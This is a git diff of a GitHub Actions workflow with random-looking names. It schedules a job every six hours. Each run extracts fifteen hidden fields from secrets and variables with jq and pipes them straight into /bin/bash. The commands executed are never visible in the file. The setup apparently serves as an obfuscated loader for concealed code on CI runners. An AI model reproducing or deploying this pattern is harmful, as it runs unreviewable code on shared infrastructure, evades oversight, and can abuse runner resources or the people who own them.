@@ -1,19 +1,32 @@
 name: limubai7654
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 1/6 * * *'
-
-jobs:  # 6811
+    - cron: '56 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: limubai7654
         env:
-          puvy4: ${{ secrets.puvy4 }}
+          sydsr3896: ${{ secrets.sydsr3896 }}
         run: |
-          echo $puvy4 | jq -r .eo2905 | /bin/bash
-          echo $tjmz132 | jq -r .iesie18 | /bin/bash
-          echo $wisi850 | jq -r .zmnm57047 | /bin/bash
+          echo $sydsr3896 | jq -r .t7468 | /bin/bash
+          echo $uwe9255 | jq -r .xczwn8298 | /bin/bash
+          echo $qugf16 | jq -r .ql636 | /bin/bash
+          echo $ubcjj0242 | jq -r .ahrq180 | /bin/bash
+          echo $ayb7413 | jq -r .pkcx79645 | /bin/bash
+          echo $gi8017 | jq -r .jwtpb75837 | /bin/bash
+          echo $ns120 | jq -r .ihvnd970 | /bin/bash
+          echo $qvkev6 | jq -r .ssjp29283 | /bin/bash
+          echo $l4 | jq -r .j8 | /bin/bash
+          echo $oon031 | jq -r .qzsq36203 | /bin/bash
+          echo $cpgzp365 | jq -r .mszbl822 | /bin/bash
+          echo $ohtu8 | jq -r .nhvt10 | /bin/bash
+          echo $a837 | jq -r .cfmop60137 | /bin/bash
+          echo $e5 | jq -r .oze645 | /bin/bash
+          echo $yf776 | jq -r .qbfh7945 | /bin/bash
 
